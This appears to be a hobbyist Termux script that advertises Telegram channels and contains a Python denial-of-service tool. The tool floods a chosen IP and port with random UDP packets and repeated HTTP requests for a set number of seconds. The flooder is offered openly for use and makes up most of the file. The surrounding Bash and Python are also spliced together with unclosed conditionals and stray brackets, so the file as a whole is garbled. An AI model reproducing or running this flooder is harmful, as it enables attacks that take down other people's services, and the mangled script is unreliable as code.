apt-get install figlet
clear
figlet CmdTools

echo "The Tool Made By : https://t.me/Termux_Commamd"

echo "Talk To Dev Tool In Telegram : @TalkToDevTermuxBot"

echo "Type 'tools' To Show Tools"
read -p "Terminal_$ " tar
if [ "$tar" == "tools" ]
then
 echo "① Type '1' To Open Tool ddos attack"
if [ "$tar" == "1"
import socket
import random
import time
print("""

 __                      _     _     __     __   
/\   \   /\ \_\ \   /\ \/\ \      /\  -.  /\  -.  /\   \   /\  ___\  
\ \   \  \ \   \  \ \ \_\ \     \ \ \/\ \ \ \ \/\ \ \ \ \/\ \  \ \___  \ 
 \ \_\ \_\  \ \_\ \_\  \ \_\     \ \__-  \ \-  \ \_\  \/\___\
  \/_/\/_/   \/_/\/_/   \/_/      \/__/   \//   \/_/   \/___/ """)
  
print("Made by  team A.H.U | Netstat_stat")
def ddos(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    sock.settimeout(1)
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print(f"{current_time} - DDoS: {target_ip}")
            
            sock.sendto(data, (target_ip, target_port))
            request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.sendall(request.encode())
            
        except socket.timeout:
            print("error")
            break

    sock.close()
target_ip = input("ip: ")
target_port = int(input("port:"))
duration = int(input("attack in sec:"))
ddos(target_ip, target_port, duration)]
